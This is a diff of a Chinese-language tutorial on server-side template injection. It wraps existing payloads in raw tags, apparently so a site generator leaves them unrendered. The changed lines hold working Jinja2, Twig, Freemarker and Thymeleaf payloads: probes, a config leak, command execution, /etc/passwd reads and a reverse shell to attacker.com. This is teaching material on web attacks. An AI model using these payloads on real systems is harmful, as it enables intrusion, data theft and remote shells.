@@ -150,7 +150,7 @@ http://example.com/greet?name=Alice
 
 恶意请求（Jinja2）：
 ```
-http://example.com/greet?name={{7*7}}
+http://example.com/greet?name={% raw %}{{7*7}}{% endraw %}
 ```
 
 页面输出：
@@ -158,7 +158,7 @@ http://example.com/greet?name={{7*7}}
 <h1>Hello, 49!</h1>
 ```
 
-如果看到 `49` 而不是 `{{7*7}}`，说明模板表达式被执行，存在SSTI漏洞。
+如果看到 `49` 而不是 `{% raw %}{{7*7}}{% endraw %}`，说明模板表达式被执行，存在SSTI漏洞。
 
 ### SSTI攻击流程
 
@@ -744,10 +744,10 @@ ERB是Ruby的默认模板引擎。
 | Jinja2 | {% raw %}`{{7*7}}`{% endraw %} | 49 |
 | Twig | {% raw %}`{{7*7}}`{% endraw %} | 49 |
 | Smarty | `{7*7}` | 49 |
-| Freemarker | `${7*7}` | 49 |
+| Freemarker | `{% raw %}${7*7}{% endraw %}` | 49 |
 | Velocity | `$class` 或 `#set($x=7*7)$x` | - |
-| Thymeleaf | `${7*7}` | 49 |
-| Django | `{{7|add:7}}` | 14 |
+| Thymeleaf | `{% raw %}${7*7}{% endraw %}` | 49 |
+| Django | `{% raw %}{{7|add:7}}{% endraw %}` | 14 |
 | ERB | `<%= 7*7 %>` | 49 |
 
 ### Jinja2 Payload大全
@@ -1162,7 +1162,7 @@ self
 **步骤1：确认漏洞**
 
 ```
-http://target.com/greet?name={{7*7}}
+http://target.com/greet?name={% raw %}{{7*7}}{% endraw %}
 ```
 
 返回 `49`，确认存在Jinja2 SSTI。
@@ -1170,7 +1170,7 @@ http://target.com/greet?name={{7*7}}
 **步骤2：信息收集**
 
 ```
-http://target.com/greet?name={{config}}
+http://target.com/greet?name={% raw %}{{config}}{% endraw %}
 ```
 
 获取Flask配置信息，包括SECRET_KEY等。
@@ -1178,7 +1178,7 @@ http://target.com/greet?name={{config}}
 **步骤3：执行命令**
 
 ```
-http://target.com/greet?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+http://target.com/greet?name={% raw %}{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}{% endraw %}
 ```
 
 返回 `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
@@ -1186,13 +1186,13 @@ http://target.com/greet?name={{self.__init__.__globals__.__builtins__.__import__
 **步骤4：读取敏感文件**
 
 ```
-http://target.com/greet?name={{self.__init__.__globals__.__builtins__.open('/etc/passwd').read()}}
+http://target.com/greet?name={% raw %}{{self.__init__.__globals__.__builtins__.open('/etc/passwd').read()}}{% endraw %}
 ```
 
 **步骤5：获取反弹Shell**
 
 ```
-http://target.com/greet?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"').read()}}
+http://target.com/greet?name={% raw %}{{self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"').read()}}{% endraw %}
 ```
 
 ### 案例2：绕过沙箱执行命令
@@ -1221,7 +1221,7 @@ http://target.com/greet?name={{self.__init__.__globals__.__builtins__.__import__
 **检测**：
 
 ```
-http://target.com/page?name={{7*7}}
+http://target.com/page?name={% raw %}{{7*7}}{% endraw %}
 ```
 
 返回 `49`，确认存在Twig SSTI。
@@ -1229,7 +1229,7 @@ http://target.com/page?name={{7*7}}
 **利用**：
 
 ```
-http://target.com/page?name={{["id"]|map("system")|join}}
+http://target.com/page?name={% raw %}{{["id"]|map("system")|join}}{% endraw %}
 ```
 
 执行 `id` 命令。
@@ -1237,7 +1237,7 @@ http://target.com/page?name={{["id"]|map("system")|join}}
 **读取文件**：
 
 ```
-http://target.com/page?name={{source('/etc/passwd')}}
+http://target.com/page?name={% raw %}{{source('/etc/passwd')}}{% endraw %}
 ```
 
 ### 案例4：Freemarker RCE
